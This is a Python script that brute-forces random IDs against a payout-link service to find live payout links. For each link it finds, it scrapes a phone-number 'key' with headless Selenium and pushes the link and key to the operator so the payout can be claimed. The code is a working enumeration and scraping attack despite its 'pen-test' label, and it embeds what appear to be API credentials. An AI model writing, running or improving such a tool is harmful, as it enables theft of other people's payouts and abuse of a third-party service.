#!/usr/bin/env python3
"""
Payout Link Hunter - Complete Production Script
Zero cost, maximum speed using redirect detection
"""

import asyncio
import aiohttp
import random
import string
import json
import time
from datetime import datetime
import requests
import sys
import os
import re # New import for regex
from selenium import webdriver # New import for web automation
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

# ==================== CONFIGURATION ====================
PUSHOVER_USER_KEY = os.getenv("PUSHOVER_USER", "uthdrjggurywppdc33k5y49nkeegqe")
PUSHOVER_APP_TOKEN = os.getenv("PUSHOVER_TOKEN", "akwpdxg8sgshj353wz3xdgfmfjbhez")
BASE_URL = "https://mesa.payoutsnetwork.com/?id="
ERROR_URL = "https://mesa.payoutsnetwork.com/error"
CONCURRENT_CONNECTIONS = 200
BATCH_SIZE = 500
REQUEST_TIMEOUT = 3
MAX_RETRIES = 1
FOUND_LINKS_FILE = "found_payouts.json"
STATS_FILE = "hunt_stats.json"
FREE_PROXIES = []
PHONE_NUMBER_PATTERN = r'\(\d{3}\)\s*\d{3}-\d{4}|\d{10}'

# ========================================================

class PayoutHunter:
    def __init__(self):
        self.found_links = self.load_found_links()
        self.stats = self.load_stats()
        self.session = None
        self.proxy_index = 0
        self.start_time = time.time()
        self.checks_count = 0
        self.use_proxies = bool(FREE_PROXIES)
        self.driver = None
        if not PUSHOVER_USER_KEY or not PUSHOVER_APP_TOKEN:
            print("⚠️  WARNING: Pushover credentials not set!")
            print("   Continuing without notifications.")

    def load_found_links(self):
        try:
            with open(FOUND_LINKS_FILE, "r") as f:
                data = json.load(f)
                return set(link["url"] for link in data.get("links", []))
        except FileNotFoundError:
            return set()

    def load_stats(self):
        try:
            with open(STATS_FILE, "r") as f:
                return json.load(f)
        except FileNotFoundError:
            return {
                'total_checked	': 0,
                'total_found': 0,
                'last_found': None,
                'hunt_sessions': 0
            }

    def save_found_link(self, url):
        data = {'links': []}
        try:
            with open(FOUND_LINKS_FILE, 'r') as f:
                data = json.load(f)
        except:
            pass
        data['links'].append({
            'url': url,
            'id': url.split('=')[-1],
            'found_at': datetime.now().isoformat(),
            'session': self.stats['hunt_sessions']
        })
        with open(FOUND_LINKS_FILE, 'w') as f:
            json.dump(data, f, indent=2)

    def save_stats(self):
        self.stats['total_checked'] = self.checks_count
        self.stats['total_found'] = len(self.found_links)
        with open(STATS_FILE, 'w') as f:
            json.dump(self.stats, f, indent=2)

    async def check_id(self, id_str, session=None):
        url = BASE_URL + id_str
        if url in self.found_links:
            return None
        if not session:
            session = self.session
        for retry in range(MAX_RETRIES + 1):
            try:
                async with session.get(url, allow_redirects=False, ssl=False) as response:
                    if response.status in [301, 302, 303, 307, 308]:
                        location = response.headers.get("Location", "")
                        if ERROR_URL in location or '/error' in location:
                            return None
                    return url
            except asyncio.TimeoutError:
                if retry < MAX_RETRIES:
                    await asyncio.sleep(0.1)
                    continue
                return None
            except Exception:
                return None
        return None

    def initialize_driver(self):
        if self.driver:
            return
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        try:
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=options)
            self.driver.set_page_load_timeout(10)
        except Exception as e:
            print(f"⚠️  WebDriver initialization failed: {e}")
            self.driver = None

    def analyze_and_extract_key(self, url):
        self.initialize_driver()
        if not self.driver:
            return None
        try:
            self.driver.get(url)
            time.sleep(2)
            
            # 1. Search the entire page source for the phone number pattern
            page_source = self.driver.page_source
            match = re.search(PHONE_NUMBER_PATTERN, page_source)
            if match:
                return match.group(0).strip()

            # 2. Search for the key in JavaScript variables (more aggressive pen-testing)
            js_script = """
            function findPhoneNumber(obj) {
                const pattern = /\(\d{3}\)\s*\d{3}-\d{4}|\d{10}/;
                for (const key in obj) {
                    if (typeof obj[key] === 'string' && pattern.test(obj[key])) {
                        return obj[key];
                    }
                }
                return null;
            }
            return findPhoneNumber(window);
            """
            js_key = self.driver.execute_script(js_script)
            if js_key:
                return js_key.strip()

            # 3. Search hidden inputs (original logic)
            hidden_inputs = self.driver.find_elements(by=webdriver.common.by.By.XPATH, value="//input[@type='hidden']")
            for element in hidden_inputs:
                value = element.get_attribute('value')
                if value and re.search(PHONE_NUMBER_PATTERN, value):
                    return value.strip()
            
            return None
        except Exception as e:
            print(f"   ⚠️  Key extraction failed for {url}: {e}")
            return None

    def send_notification(self, url, key=None):
        if not PUSHOVER_USER_KEY or not PUSHOVER_APP_TOKEN:
            return
        message_body = f"Found active payout link:\n{url}"
        if key:
            message_body = f"Key Found! Enter this to verify:\n{key}\n\nLink:\n{url}"
            title = '🔑 Payout Link & Key Found!'
        else:
            title = '💰 New Payout Found!'
        def notify():
            try:
                requests.post(
                    "https://api.pushover.net/1/messages.json",
                    data={
                        "token": PUSHOVER_APP_TOKEN,
                        "user": PUSHOVER_USER_KEY,
                        "title": title,
                        "message": message_body,
                        "url": url,
                        "url_title": "Open Payout",
                        "priority": 1,
                        "sound": "cashregister"
                    },
                    timeout=5
                )
                print(f"   📱 Notification sent!")
            except Exception as e:
                print(f"   ⚠️  Notification failed: {e}")
        asyncio.create_task(asyncio.to_thread(notify))

    async def hunt_batch(self):
        ids = []
        for _ in range(BATCH_SIZE):
            id_str = "".join(random.choices(string.ascii_letters + string.digits, k=10))
            ids.append(id_str)
        tasks = [self.check_id(id_str) for id_str in ids]
        results = await asyncio.gather(*tasks)
        found_count = 0
        for url in results:
            if url:
                if url not in self.found_links:
                    self.found_links.add(url)
                    self.save_found_link(url)
                    key = self.analyze_and_extract_key(url)
                    self.send_notification(url, key)
                    self.stats['last_found'] = datetime.now().isoformat()
                    found_count += 1
                    key_status = f"Key: {key}" if key else "Key: NOT FOUND (Manual Check Required)"
                    print(f"\n🎉 FOUND: {url} | {key_status}")
        self.checks_count += len(ids)
        return found_count

    async def main(self):
        print("🔫  Starting Payout Hunter...")
        print(f"   - Concurrent checks: {CONCURRENT_CONNECTIONS}")
        print(f"   - Batch size: {BATCH_SIZE}")
        print(f"   - Pen-Test Mode: ACTIVE (Using Selenium for key extraction)")
        print("   - Press Ctrl+C to stop")
        print("\n" + "="*40)
        self.stats['hunt_sessions'] += 1
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        connector = aiohttp.TCPConnector(limit_per_host=CONCURRENT_CONNECTIONS, ssl=False)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            self.session = session
            while True:
                try:
                    await self.hunt_batch()
                    self.save_stats()
                except aiohttp.ClientConnectorError as e:
                    print(f"\n⚠️  Connection error: {e}. Check your internet or proxy.")
                    await asyncio.sleep(10)
                except Exception as e:
                    print(f"\nAn unexpected error occurred: {e}")
                    await asyncio.sleep(10)

if __name__ == "__main__":
    hunter = PayoutHunter()
    try:
        asyncio.run(hunter.main())
    except KeyboardInterrupt:
        print("\n\n🛑 Hunt stopped by user.")
        hunter.save_stats()
        if hunter.driver:
            hunter.driver.quit()
        print("   Final stats saved.")
    finally:
        print("👋 Goodbye!")
